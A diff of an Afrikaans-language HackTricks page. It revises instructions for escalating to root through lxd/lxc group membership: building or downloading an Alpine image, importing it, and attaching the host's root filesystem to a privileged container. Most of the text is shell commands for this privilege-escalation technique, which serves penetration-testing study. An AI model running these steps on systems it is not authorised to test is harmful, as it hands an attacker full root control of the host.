@@ -2,24 +2,29 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-As jy tot die _**lxd**_ **of** _**lxc**_ **groep** behoort, kan jy root word
+As jy tot die _**lxd**_ **of** _**lxc**_ **groep** behoort, kan jy root word.
 
-## Exploiteer sonder internet
+## Exploitering sonder internet
 
 ### Metode 1
 
-Jy kan hierdie distro bouer op jou masjien installeer: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(volg die instruksies van die github):
+Jy kan 'n alpine beeld aflaai om met lxd van 'n vertroude repository te gebruik.
+Canonical publiseer daaglikse boue op hul webwerf: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Neem net beide **lxd.tar.xz** en **rootfs.squashfs** van die nuutste bou. (Gidsnaam is die datum).
+
+Alternatiewelik kan jy hierdie distro bouer op jou masjien installeer: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (volg die instruksies van die github):
 ```bash
-sudo su
 # Install requirements
 sudo apt update
-sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
 
 # Clone repo
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
 git clone https://github.com/lxc/distrobuilder
 
 # Make distrobuilder
-cd distrobuilder
+cd ./distrobuilder
 make
 
 # Prepare the creation of alpine
@@ -27,13 +32,10 @@ mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 
-# Create the container
-## Using build-lxd
-sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
-## Using build-lxc
-sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
+# Create the container - Beware of architecture while compiling locally.
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Laai die lêers **lxd.tar.xz** en **rootfs.squashfs** op, voeg die beeld by die repo en skep 'n houer:
+Laai die lêers **incus.tar.xz** (**lxd.tar.xz** as jy dit van die Canonical-bewaarplek afgelaai het) en **rootfs.squashfs** op, voeg die beeld by die repo en skep 'n houer:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -50,7 +52,7 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > As jy hierdie fout _**Fout: Geen stoorpoel gevind nie. Skep asseblief 'n nuwe stoorpoel**_\
-> Voer **`lxd init`** uit en **herhaal** die vorige stel opdragte
+> Voer **`lxd init`** uit en stel al die opsies op standaard in. Herhaal dan **die vorige stel opdragte**
 
 Uiteindelik kan jy die houer uitvoer en root verkry:
 ```bash
